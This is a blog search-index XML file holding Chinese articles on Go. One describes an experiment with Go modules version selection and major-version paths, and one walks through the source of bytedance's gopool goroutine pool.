<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于 go modules 的一个小实验</title>
      <link href="/2023/05/13/go-modules-lib/"/>
      <url>/2023/05/13/go-modules-lib/</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>最近在做项目时和同事聊到这样一个问题，假设有 a、b、c 三个库，它们之间的依赖关系如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; c</span><br><span class="line">a -&gt; b -&gt; c</span><br></pre></td></tr></table></figure><p>也就是说，如果把整个依赖关系看作一棵以 a 为根节点的树，那么它有两条路径可以走到 c。</p><p>此时的问题是，如果 a 依赖的 c 与 b 依赖的 c 版本相同，整个项目中存在几个 c？如果 c 的版本不同，整个项目中存在几个 c？</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>先说结论，go modules 在决策外部依赖的版本时会使用<strong>最小版本选择</strong>（<a href="https://research.swtch.com/vgo-mvs" target="_blank" rel="noopener">Minimal Version Selection</a>）算法，这个算法最终保证项目会使用最合适的最低版本的外部依赖，其中版本使用<strong>语义化版本</strong>（<a href="https://semver.org/lang/zh-CN/" target="_blank" rel="noopener">SemVer</a>）。对于本文想要探究的问题而言，答案是当主版本号未变化时最终整个项目只会存在一个 c，主版本号发生变化时会存在多个 c。</p><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><blockquote><p>以下实验使用 1.18 版本的 golang</p></blockquote><p>为了验证这个问题，我们创建如下三个库：testlib1、testlib2、testlib3，分别对应前文所述的 c、b、a。</p><h2 id="准备-testlib1（也就是前文的-c）"><a href="#准备-testlib1（也就是前文的-c）" class="headerlink" title="准备 testlib1（也就是前文的 c）"></a>准备 testlib1（也就是前文的 c）</h2><p>在 testlib1 中，我们写入如下的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> testlib1</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> globalMap <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> prefix = <span class="string">"testlib1@v0.0.1 "</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(k, v <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(prefix + <span class="string">"Register"</span>)</span><br><span class="line">globalMap[k] = v</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetAll</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(prefix + <span class="string">"GetAll"</span>)</span><br><span class="line">fmt.Println(globalMap)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的逻辑很简单，我们创建了一个全局的 map，并提供一个 Register 方法向 map 中写入内容，提供一个 GetAll 方法输出全局 map 中的内容。此外为了观察版本，我们在 Register 与 GetAll 中输出当前的版本。</p><p>将这段代码进行 commit，并打上 <strong>0.0.1</strong> 的 tag。然后分别将 prefix 常量中的版本号改为 <strong>0.0.2，0.2.1，2.0.1</strong>，并创建对应的 commit 与 tag，做完这些操作，我们将拥有一个包含了 4 次 commit 的 testlib1。为了能够使用这个库，可以将它发布到 <a href="https://github.com/WqVoon/testlib1" target="_blank" rel="noopener">github</a> 上。</p><p>此时 testlib1 的状态如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">testlib1@v0.0.1 --依赖--&gt; 无</span><br><span class="line">testlib1@v0.0.2 --依赖--&gt; 无</span><br><span class="line">testlib1@v0.2.1 --依赖--&gt; 无</span><br><span class="line">testlib1@v2.0.1 --依赖--&gt; 无</span><br></pre></td></tr></table></figure><h2 id="准备-testlib2（也就是前文的-b）"><a href="#准备-testlib2（也就是前文的-b）" class="headerlink" title="准备 testlib2（也就是前文的 b）"></a>准备 testlib2（也就是前文的 b）</h2><p>在 testlib2 中，首先通过 <code>go get github.com/wqvoon/testlib1@v0.0.1</code> 拉取最低版本的 testlib1，然后在 testlib2 中写入如下的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> testlib2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/wqvoon/testlib1"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> prefix = <span class="string">"testlib2@v0.0.1 "</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WrapperRegister</span><span class="params">(k, v <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">fmt.Println(prefix + <span class="string">"WrapperRegister"</span>)</span><br><span class="line">testlib1.Register(k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WrapperGetAll</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(prefix + <span class="string">"WrapperGetAll"</span>)</span><br><span class="line">testlib1.GetAll()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 testlib2 中，我们包装了 testlib1 的 Register 和 GetAll，在原本的逻辑之外输出了 testlib2 自身的版本信息。</p><p>同样，我们对这段代码进行 commit，并打上 <strong>0.0.1</strong> 的 tag。然后，我们用 <code>go get github.com/wqvoon/testlib1@v0.0.2</code> 拉取 <strong>0.0.2</strong> 版本的 testlib1，修改 prefix 为 “<a href="mailto:testlib2@v0.0.2" target="_blank" rel="noopener">testlib2@v0.0.2</a> “，然后进行 commit，并打上 <strong>0.0.2</strong> 的 tag。做完这些操作，我们将拥有一个包含 2 次 commit 的 testlib2，为了能够使用这个库，可以将它发布到 <a href="https://github.com/WqVoon/testlib2" target="_blank" rel="noopener">github</a> 上。</p><p>此时 testlib2 的状态如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testlib2@v0.0.1 --依赖--&gt; testlib1@v0.0.1</span><br><span class="line">testlib2@v0.0.2 --依赖--&gt; testlib1@v0.0.2</span><br></pre></td></tr></table></figure><h2 id="准备-testlib3（也就是前文的-a）"><a href="#准备-testlib3（也就是前文的-a）" class="headerlink" title="准备 testlib3（也就是前文的 a）"></a>准备 testlib3（也就是前文的 a）</h2><p>在 testlib3 中，首先通过  <code>go get github.com/wqvoon/testlib2@v0.0.1</code> 拉取最低版本的 testlib2，根据我们之前的代码，它内部依赖 0.0.1 版本的 testlib1。然后在 testlib3 中写入如下的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/wqvoon/testlib1"</span></span><br><span class="line"><span class="string">"github.com/wqvoon/testlib2"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">testlib2.WrapperRegister(<span class="string">"name"</span>, <span class="string">"hygao"</span>)</span><br><span class="line">testlib1.GetAll()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面来进行一些 <code>go run</code> 与 <code>go get</code> 的交替操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> testlib1@v0.0.1 / testlib2@v0.0.1</span></span><br><span class="line">➜  testlib3 go run .</span><br><span class="line">testlib2@v0.0.1 WrapperRegister</span><br><span class="line">testlib1@v0.0.1 Register</span><br><span class="line">testlib1@v0.0.1 GetAll</span><br><span class="line">map[name:hygao]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> testlib1@v0.0.2 / testlib2@v0.0.1</span></span><br><span class="line">➜  testlib3 go get github.com/wqvoon/testlib1@v0.0.2</span><br><span class="line">go: upgraded github.com/wqvoon/testlib1 v0.0.1 =&gt; v0.0.2</span><br><span class="line">➜  testlib3 go run .</span><br><span class="line">testlib2@v0.0.1 WrapperRegister</span><br><span class="line">testlib1@v0.0.2 Register</span><br><span class="line">testlib1@v0.0.2 GetAll</span><br><span class="line">map[name:hygao]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> testlib1@v0.2.1 / testlib2@v0.0.1</span></span><br><span class="line">➜  testlib3 go get github.com/wqvoon/testlib1@v0.2.1</span><br><span class="line">go: upgraded github.com/wqvoon/testlib1 v0.0.2 =&gt; v0.2.1</span><br><span class="line">➜  testlib3 go run .</span><br><span class="line">testlib2@v0.0.1 WrapperRegister</span><br><span class="line">testlib1@v0.2.1 Register</span><br><span class="line">testlib1@v0.2.1 GetAll</span><br><span class="line">map[name:hygao]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> testlib1@v2.0.1 / testlib2@v0.0.1</span></span><br><span class="line">➜  testlib3 go get github.com/wqvoon/testlib1@v2.0.1</span><br><span class="line">go: github.com/wqvoon/testlib1@v2.0.1: invalid version: module contains a go.mod file, so module path must match major version ("github.com/wqvoon/testlib1/v2")</span><br></pre></td></tr></table></figure><p>上面的输出中，有一些值得关注的点：</p><ul><li>首先，上面的例子能够说明最终整个项目只有一个 testlib1，因为我们在 testlib3 中调用 <code>testlib2.WrapperRegister</code> 来向全局 map 中写入内容，调用 <code>testlib1.GetAll</code> 从 map 中读取内容，而不论 testlib3 使用的 testlib1 是否与 testlib2 中使用的 testlib1（也就是 0.0.1 版本）相同，输出的结果都是相同的。如果项目中存在多个 testlib1，那么某次 <code>go run</code> 应该输出空的 map。</li><li>其次，尽管 testlib2 中要求 testlib1 的版本是 0.0.1，但如果 testlib3 使用了更新的版本，那么根据最小版本选择算法，整个项目也会使用 testlib3 指定的版本，这一点可以通过 <code>go run</code> 中输出的 testlib1 的版本来验证，可以发现它是与 <code>go get</code> 声明的版本保持一致的。</li><li>最后，go modules 使用的版本遵循<strong>语义化版本</strong>（<a href="https://semver.org/lang/zh-CN/" target="_blank" rel="noopener">SemVer</a>），根据这个规范，x.y.z 中的 y 和 z 变动时都是向下兼容的，此时最小版本选择算法可以放心使用 y.z 更大的版本而不必担心项目无法正常编译。但当 x 发生变化时，这个假设就不成立了，此时 go modules 对我们有一些更高的要求。</li></ul><h2 id="准备-v2-版本的-testlib1（也就是前文的-c）"><a href="#准备-v2-版本的-testlib1（也就是前文的-c）" class="headerlink" title="准备 v2 版本的 testlib1（也就是前文的 c）"></a>准备 v2 版本的 testlib1（也就是前文的 c）</h2><p>正如上面 <code>go get</code> 的提示，为了使用主版本号更新了的 testlib1，需要将 go.mod 文件中的 module 从 <code>github.com/wqvoon/testlib1</code> 改为 <code>github.com/wqvoon/testlib1/v2</code>。同时为了与前面失败的 2.0.1 作区分，我们修改 prefix 为 “<a href="mailto:testlib1@v2.0.2" target="_blank" rel="noopener">testlib1@v2.0.2</a> “，然后做 commit 并打上对应的 tag 后将其提交到 github 上。</p><p>此时回到 testlib3，我们可以通过 <code>go get github.com/wqvoon/testlib1/v2@v2.0.2</code> 来拉取 v2 版本的 testlib1，拉取成功后将代码修改为如下内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/wqvoon/testlib1"</span></span><br><span class="line">testlib1v2 <span class="string">"github.com/wqvoon/testlib1/v2"</span></span><br><span class="line"><span class="string">"github.com/wqvoon/testlib2"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">testlib2.WrapperRegister(<span class="string">"name"</span>, <span class="string">"hygao"</span>)</span><br><span class="line">testlib1.GetAll()</span><br><span class="line">testlib1v2.GetAll()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续执行 <code>go run</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  testlib3 <span class="keyword">go</span> run .</span><br><span class="line">testlib2@v0<span class="number">.0</span><span class="number">.1</span> WrapperRegister</span><br><span class="line">testlib1@v0<span class="number">.0</span><span class="number">.1</span> Register</span><br><span class="line">testlib1@v0<span class="number">.0</span><span class="number">.1</span> GetAll</span><br><span class="line"><span class="keyword">map</span>[name:hygao]</span><br><span class="line">testlib1@v2<span class="number">.0</span><span class="number">.2</span> GetAll</span><br><span class="line"><span class="keyword">map</span>[]</span><br></pre></td></tr></table></figure><p>从上面的输出中我们可以发现，此时整个项目中已经存在两个 testlib1 了，testlib2 使用 <strong>0.0.1</strong> 版本的 testlib1，testlib3 使用 <strong>2.0.2</strong> 版本的 testlib1，两者的全局 map 也不相同，所以 <code>go run</code> 输出了两个内容不同的 map。</p><h2 id="一点小拓展"><a href="#一点小拓展" class="headerlink" title="一点小拓展"></a>一点小拓展</h2><p>上面的几组测试中，我们都保证了 testlib3 依赖的 testlib1 的版本大于 testlib2 依赖的 testlib1 版本。下面我们测试一下小于的情况，回到 testlib3，执行 <code>go get github.com/wqvoon/testlib2@v0.0.2</code> 拉取 <strong>0.0.2</strong> 版本的 testlib2，根据我们前面的配置，这个版本的 testlib2 依赖 <strong>0.0.2</strong> 版本的 testlib1。</p><p>更新了 testlib2 后，如果我们继续在 testlib3 中执行 <code>go get github.com/wqvoon/testlib1@v0.0.1</code> ，就会发现 golang 进行了如下的输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  testlib3 go get github.com/wqvoon/testlib1@v0.0.1</span><br><span class="line">go: downgraded github.com/wqvoon/testlib1 v0.0.2 =&gt; v0.0.1</span><br><span class="line">go: downgraded github.com/wqvoon/testlib2 v0.0.2 =&gt; v0.0.1</span><br></pre></td></tr></table></figure><p>也就是说，golang 将 testlib2 也进行了降级，使整个项目能够满足用户对 testlib1 的版本要求。</p><p>那么，是否有办法强制使用 <strong>0.0.2</strong> 版本的 testlib2，但却使用 <strong>0.0.1</strong> 版本的 testlib1 呢？答案是可以使用 replace，此时 testlib3 的 go.mod 文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">module github.com/wqvoon/testlib3</span><br><span class="line"></span><br><span class="line">go 1.18</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">github.com/wqvoon/testlib1 v0.0.2</span><br><span class="line">github.com/wqvoon/testlib2 v0.0.2</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">replace github.com/wqvoon/testlib1 =&gt; github.com/wqvoon/testlib1 v0.0.1</span><br></pre></td></tr></table></figure><p>然后执行 <code>go run</code> 就可以看到如下的输出了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  testlib3 go run .</span><br><span class="line">testlib2@v0.0.2 WrapperRegister</span><br><span class="line">testlib1@v0.0.1 Register</span><br><span class="line">testlib1@v0.0.1 GetAll</span><br><span class="line">map[name:hygao]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bytedance/gopkg 中 gopool 的源码解读</title>
      <link href="/2023/04/16/GoPool/"/>
      <url>/2023/04/16/GoPool/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天从连接池的角度阅读了标准库中 database/sql 的源码，并写了对应的<a href="/2023/04/12/SqlConnectionPool/">博客</a>做总结。最近逛 github 时看到字节开源的 gopkg 代码库中有一个叫 <a href="https://github.com/bytedance/gopkg/tree/develop/util/gopool" target="_blank" rel="noopener">gopool</a> 的协程池实现，代码只有 200 多行，感觉还蛮有意思的，于是就有了现在的这篇文章。</p><h1 id="功能简述"><a href="#功能简述" class="headerlink" title="功能简述"></a>功能简述</h1><p>根据 readme 来看，gopool 的目标是作为 go 关键字的一个可选方案，具体来说，它对外暴露了 gopool.Go 这个函数，内部接收一个函数作为入参，这个函数不接受任何参数也不返回任何内容，但因为 golang 本身有闭包的特性，所以这并不影响使用。</p><p>我个人非常喜欢 gopool 对外暴露的接口，因为它与 golang 本身的相似性使得使用起来时几乎没有什么心智负担。还是以 gopool.Go 函数为例，同 go 关键字相同，这个作为入参的函数是异步执行的，而且调用方也不会因为这个函数调用而阻塞。为了达成这个效果，gopool 不能真的起一个 goroutine，取而代之的，它用了类似 js 的任务队列的方式，因为它本身是做协程池的，如果每调一次 gopool.Go 就创建一个新协程，那这个函数就没意义了。</p><p>最后，gopool 处理了协程内部的 panic。这点很重要，因为如果你使用了某个框架来开发应用，那么你的主流程的 panic 很可能可以被这个框架捕获并优雅处理，从而保证应用整体不会因为这个 panic 而崩溃，但如果你在主流程中启动了新的协程，这个协程的 panic 就需要由你自己来保证了，而这项工作通常是重复且枯燥的，gopool.Go 在这点上提供了一种侵入性很低的解决方案。</p><h1 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h1><p>接下来把视角回到代码本身，上面介绍的 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/gopool.go#L36-L43" target="_blank" rel="noopener">gopool.Go</a> 函数其实是对全局 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/gopool.go#L23-L24" target="_blank" rel="noopener">defaultPool</a> 变量的 CtxGo 方法的调用（golang 标准库中有很多函数也是类似的实现方式，比如 net/http 的 client 和 handler），所以如果要了解原理，就需要看 defaultPool 本身是什么。</p><p>从定义上看，defaultPool 是一个 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/pool.go#L23-L36" target="_blank" rel="noopener">Pool</a> 接口的实例，由 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/pool.go#L93-L101" target="_blank" rel="noopener">NewPool</a> 函数初始化，这个函数的功能很简单，它根据入参构造了一个 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/pool.go#L72-L91" target="_blank" rel="noopener">pool</a> 结构，然后将这个结构返回。pool 结构是 Pool 接口的一个实现，它的定义是下面这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> pool <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// 协程池的名字，有 Name 方法可以返回</span></span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个协程池同时最多允许多少 worker 存在</span></span><br><span class="line"><span class="built_in">cap</span> <span class="keyword">int32</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 配置信息，目前只有一个阈值的属性，具体见下文</span></span><br><span class="line">config *Config</span><br><span class="line">  </span><br><span class="line"><span class="comment">// task 队列的元信息，每一个 task 代表一个待执行的函数</span></span><br><span class="line">taskHead  *task</span><br><span class="line">taskTail  *task</span><br><span class="line">taskLock  sync.Mutex</span><br><span class="line">taskCount <span class="keyword">int32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前有多少个 worker 在运行中，每个 worker 代表一个 goroutine</span></span><br><span class="line">workerCount <span class="keyword">int32</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由这个协程池中的协程引发的 panic 会由该函数处理</span></span><br><span class="line">panicHandler <span class="function"><span class="keyword">func</span><span class="params">(context.Context, <span class="keyword">interface</span>&#123;&#125;)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>所以从这个定义我们能知道，如果把 pool 看作是一个可操作单元，那么它内部维护了一个 task 的队列（通过链表来实现），其中的每个 task 结构代表一个待执行的函数，除此之外，它还对应多个 worker，这些 worker 从 task 中获取函数并执行。总结来说，pool.CtxGo 方法是 task 的生产者，worker 则是 task 的消费者，两者的交互通过 task 链表来完成。</p><p>下面我们直接来看 pool.CtxGo 这个方法，它也是协程池的核心方法，它的定义是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *pool)</span> <span class="title">CtxGo</span><span class="params">(ctx context.Context, f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 从 taskPool 中取一个 task 结构体，通过复用结构体来减少 gc 压力</span></span><br><span class="line">t := taskPool.Get().(*task)</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 使用入参来初始化 task 结构</span></span><br><span class="line">t.ctx = ctx</span><br><span class="line">t.f = f</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 通过加锁将 task 并发安全地放在队列的尾部，并更新队列长度</span></span><br><span class="line">p.taskLock.Lock()</span><br><span class="line"><span class="keyword">if</span> p.taskHead == <span class="literal">nil</span> &#123;</span><br><span class="line">p.taskHead = t</span><br><span class="line">p.taskTail = t</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p.taskTail.next = t</span><br><span class="line">p.taskTail = t</span><br><span class="line">&#125;</span><br><span class="line">p.taskLock.Unlock()</span><br><span class="line">atomic.AddInt32(&amp;p.taskCount, <span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 满足条件时，从 workerPool 中取一个 worker 结构并在初始化后调用其 run 方法</span></span><br><span class="line"><span class="keyword">if</span> (atomic.LoadInt32(&amp;p.taskCount) &gt;= p.config.ScaleThreshold &amp;&amp; p.WorkerCount() &lt; atomic.LoadInt32(&amp;p.<span class="built_in">cap</span>)) || p.WorkerCount() == <span class="number">0</span> &#123;</span><br><span class="line">p.incWorkerCount()</span><br><span class="line">w := workerPool.Get().(*worker)</span><br><span class="line">w.pool = p</span><br><span class="line">w.run()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 gopool 中，task 和 worker 都通过 sync.Pool 来实现复用。当拿到一个可用的 task 结构后，pool.CtxGo 会将它放入 task 队列的尾部，然后判断一些条件，如果满足就获取一个可用的 worker 并调用其 run 方法，否则直接退出函数。所以整个过程中与入参的 f（也就是用户希望通过 goroutine 执行的函数）的关系其实只在于将它加入到链表中，f 在 pool.CtxGo 中并没有被执行到。</p><p>worker 是真正干活的部分，它在 worker.pool 字段中保存了自己当前负责处理的 pool 结构，所以它也能间接访问到这个 pool 中的 task 链表。而它的核心方法是 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/worker.go#L40-L74" target="_blank" rel="noopener">worker.run</a>。可以发现，这个方法整体就是一个普通的 goroutine，内部有一个 for 循环，循环内首先尝试从 pool 的 task 链表中获取一个任务，如果拿到的是 nil，那么说明当前 pool 内没有要执行的 task，此时会做一些收尾工作并结束整个 goroutine 的运行。而如果获取到了 task，那么它会调用其内部的 f，这个 f 对应用户传入的某个待运行的函数。执行完毕后，这个 task 会被回收到 taskPool 中供未来复用。</p><p>如果某个 task 执行时发生 panic，这个 panic 会被捕获，此时如果用户通过 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/pool.go#L141-L144" target="_blank" rel="noopener">pool.SetPanicHandler</a> 设置了 pool.panicHandler，那么 recover 返回的内容会被传递给这个函数，方便用户自己做一些自定义的操作。</p><p>这里需要注意的是，为了实现 panic 的捕获，worker.run 在 for 循环内部起了一个<a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/worker.go#L58-L70" target="_blank" rel="noopener">立即执行表达式</a>，并在内部通过 defer 来做 panic 的 recover。这是必要的，因为只有这样它才能把 panic 的影响限制在单个 task 上。否则如果放在 worker.run 的一开始，那么当某个 task panic 时整个 worker.run 函数就会结束，其他的 task 就没办法被继续执行了；而如果放在内部的 goroutine 中，worker.run 就需要在 goroutine 异常退出时创建一个新的 goroutine，这就需要引入更多的 goroutine 来做监控，因为 worker.run 本身的执行是一定不能阻塞的，否则对外暴露的 gopool.Go 就会阻塞，这就与 go 关键字的行为不一致了。</p><p>到此为止，我们就基本梳理完了协程池中 task 的创建与消费，但如果你回头看 pool 的定义，会发现它 cap 和 config 的字段没有提到，因为 pool.CtxGo 中 <a href="https://github.com/bytedance/gopkg/blob/develop/util/gopool/pool.go#L133" target="_blank" rel="noopener">if</a> 的条件我们也还没有分析。先说结论，一个 worker 就有能力消费掉 pool 中的所有 task，虽然这个消费的过程与主流程是异步的，但它自己内部其实是串行的，这意味着如果执行某个 task 需要花很长的时间，那么后面的 task 都要等这个 task 执行完才能继续被执行，所以为了解决这个问题，我们就需要有多个 worker 来一起并发消费 pool 中的 task。但通过前面的分析我们知道，一个 worker 对应一个 goroutine，而 gopool 是做协程池的，所以它必须要能够限制 goroutine 的数量。</p><p>所以总结来说，我们既需要在 task 数量达到某个值时创建新的 worker 来避免所有的 task 串行执行，又需要限制 worker 的数量不能超过某个值。这个需求就是通过前面被我们跳过的 if 来实现的，具体来说，pool.config.ScaleThreshold 定义了一个下限，当 task 的数量大于等于这个值时，新的 worker 可能会被创建，而 pool.cap 定义了一个上限，它要求 worker 的总数不能超过这个值，这两个条件同时配合起来，就能够满足我们的要求了。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从连接池的角度阅读 database/sql 包的源码</title>
      <link href="/2023/04/12/SqlConnectionPool/"/>
      <url>/2023/04/12/SqlConnectionPool/</url>
      
